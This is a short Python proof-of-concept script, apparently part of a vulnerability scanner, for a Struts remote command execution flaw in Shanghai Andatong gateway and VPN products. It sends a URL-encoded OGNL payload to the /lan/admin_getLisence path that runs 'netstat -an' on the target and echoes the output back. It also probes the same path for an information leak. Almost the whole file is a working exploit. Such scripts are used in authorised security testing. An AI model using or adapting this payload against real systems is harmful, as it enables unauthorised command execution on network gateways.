#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 上海安达通某网关产品&某VPN产品struts命令执行
referer: http://www.wooyun.org/bugs/WooYun-2015-131408
author: Lucifer
description: 全网行为管理TPN-2G安全网关产品”和“SJW74系列安全网关”都存在一处敏感信息泄漏&远程命令执行。
'''
import sys
import requests


class adtsec_gateway_struts_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/lan/admin_getLisence?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27netstat%27,%27-an%27})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Active Internet connections" in req.text:
                return "[+]存在上海安达通某网关产品&某VPN产品struts命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Linux]"

            elif r"Active Connections" in req.text or r"活动连接" in req.text:
                return "[+]存在上海安达通某网关产品&某VPN产品struts命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Windows]"

            elif r"LISTEN" in req.text:
                return "[+]可能存在上海安达通某网关产品&某VPN产品struts命令执行漏洞...(高危)\tpayload: "+vulnurl

            else:
                pass
            vulnurl = self.url + "/lan/admin_getLisence"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"beginrecord" in req.text and r"asave" in req.text:
                return "[+]存在上海安达通某网关产品&某VPN产品struts信息泄露漏洞...(低危)\tpayload: "+vulnurl
            else:
                return "[-]no vuln"

        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = adtsec_gateway_struts_exec_BaseVerify(sys.argv[1])
    testVuln.run()